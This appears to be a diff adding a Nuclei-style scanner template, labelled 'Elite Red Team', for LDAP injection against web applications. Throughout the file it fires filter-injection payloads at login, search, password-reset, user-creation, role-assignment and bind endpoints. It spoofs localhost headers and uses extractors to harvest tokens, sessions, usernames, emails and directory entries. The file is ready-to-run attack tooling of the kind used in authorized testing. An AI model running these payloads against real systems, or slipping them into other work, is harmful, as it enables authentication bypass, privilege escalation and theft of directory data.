@@ -1,0 +1,438 @@
+id: medium-webapp-ldap-injection-authentication-bypass
+
+info:
+  name: LDAP Injection Authentication Bypass - Elite Red Team
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced LDAP injection techniques for authentication bypass.
+    Tests for LDAP query manipulation, filter injection, and directory traversal.
+    Includes multiple LDAP exploitation vectors and authentication bypass methods.
+  reference:
+    - https://owasp.org/www-community/attacks/LDAP_Injection
+    - https://portswigger.net/web-security/nosql-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-90
+  tags: ldap-injection,authentication-bypass,directory-traversal,red-team
+
+variables:
+  # Common LDAP injection payloads
+  ldap_payloads:
+    - "*"
+    - "*)(uid=*"
+    - "*)(|(uid=*"
+    - "*)(&(uid=*"
+    - "*))%00"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/api/auth"
+      - "{{BaseURL}}/ldap/auth"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    # Basic LDAP injection bypass
+    body: |
+      username=*)(uid=*)(&(uid=*&password=anything
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "welcome"
+          - "dashboard"
+          - "logged in"
+          - "success"
+          - "redirect"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "invalid"
+          - "incorrect"
+          - "failed"
+          - "error"
+        condition: and
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"token":\s*"([^"]+)"'
+          - '"session":\s*"([^"]+)"'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth/ldap"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # JSON LDAP injection
+    body: |
+      {
+        "username": "*)(|(uid=*",
+        "password": "*)(&(uid=*"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "authenticated"
+          - "login successful"
+          - "access granted"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/search"
+      - "{{BaseURL}}/directory/search"
+      - "{{BaseURL}}/ldap/search"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # LDAP search injection
+    body: |
+      query=*)(objectClass=*)(&(objectClass=*&filter=user
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "cn="
+          - "uid="
+          - "mail="
+          - "objectClass="
+          - "dn="
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'cn=([^,\r\n]+)'
+          - 'uid=([^,\r\n]+)'
+          - 'mail=([^,\r\n]+)'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/users"
+      - "{{BaseURL}}/api/admin/ldap"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Admin LDAP injection
+    body: |
+      {
+        "filter": "*)(|(cn=admin*)(&(cn=*",
+        "attributes": ["*"],
+        "scope": "subtree"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "root"
+          - "manager"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/profile"
+      - "{{BaseURL}}/api/user/info"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # LDAP injection via GET parameters
+    raw:
+      - |
+        GET {{path}}?uid=*)(uid=*)(&(uid=*&ou=users HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "profile"
+          - "user"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/password/reset"
+      - "{{BaseURL}}/forgot-password"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # LDAP injection in password reset
+    body: |
+      email=*)(mail=*)(&(mail=*@example.com
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "reset"
+          - "sent"
+          - "email"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/group/members"
+      - "{{BaseURL}}/directory/group"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # LDAP group injection
+    body: |
+      {
+        "group": "*)(|(cn=*)(&(cn=*",
+        "base_dn": "ou=groups,dc=example,dc=com"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "member"
+          - "group"
+          - "cn="
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/auth/validate"
+      - "{{BaseURL}}/auth/check"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # LDAP validation bypass
+    body: |
+      username=*))%00&password=*))%00&domain=*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "valid"
+          - "authenticated"
+          - "authorized"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/create"
+      - "{{BaseURL}}/admin/user/add"
+
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{admin_token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # LDAP user creation injection
+    body: |
+      {
+        "username": "*)(|(uid=admin*)(&(uid=*",
+        "password": "password123",
+        "email": "test@example.com",
+        "ou": "*)(|(ou=*)(&(ou=*"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "created"
+          - "added"
+          - "success"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/role/assign"
+      - "{{BaseURL}}/admin/permissions"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # LDAP role assignment injection
+    body: |
+      user=*)(|(uid=*)(&(uid=*&role=*)(|(cn=admin*)(&(cn=*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "assigned"
+          - "role"
+          - "permission"
+          - "admin"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/directory/tree"
+      - "{{BaseURL}}/ldap/browse"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      Authorization: Bearer {{token}}
+
+    # LDAP directory traversal
+    raw:
+      - |
+        GET {{path}}?base=*)(|(objectClass=*)(&(objectClass=*&scope=subtree HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{token}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "objectClass"
+          - "dn="
+          - "ou="
+          - "dc="
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/auth/bind"
+      - "{{BaseURL}}/ldap/bind"
+
+    headers:
+      Content-Type: application/json
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # LDAP bind injection
+    body: |
+      {
+        "dn": "*)(|(cn=*)(&(cn=*",
+        "password": "*)(|(userPassword=*)(&(userPassword=*",
+        "server": "ldap://localhost"
+      }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "bind"
+          - "success"
+          - "connected"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'dn:\s*([^\r\n]+)'
+          - 'cn:\s*([^\r\n]+)'
+          - 'uid:\s*([^\r\n]+)'
+          - 'mail:\s*([^\r\n]+)'
+          - 'objectClass:\s*([^\r\n]+)'
